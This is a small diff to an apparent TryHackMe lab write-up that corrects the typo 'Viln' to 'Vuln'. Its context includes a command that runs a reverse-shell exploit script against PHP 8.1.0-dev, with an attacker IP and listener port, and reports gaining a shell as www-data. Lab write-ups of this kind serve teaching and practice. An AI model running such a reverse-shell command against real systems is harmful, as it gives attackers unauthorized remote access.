@@ -59,7 +59,7 @@ Run:
 python3 revshell_php_8.1.0-dev.py http://10.10.X.X 10.8.X.X 4444
 
 IP	Belongs To:
-10.10.X.X	Target (TryHackMe Viln Machine)
+10.10.X.X	Target (TryHackMe Vuln Machine)
 10.8.X.X	Attacker (Your Attacking Machine)
 
 This gave me a reverse shell as www-data on my listener.
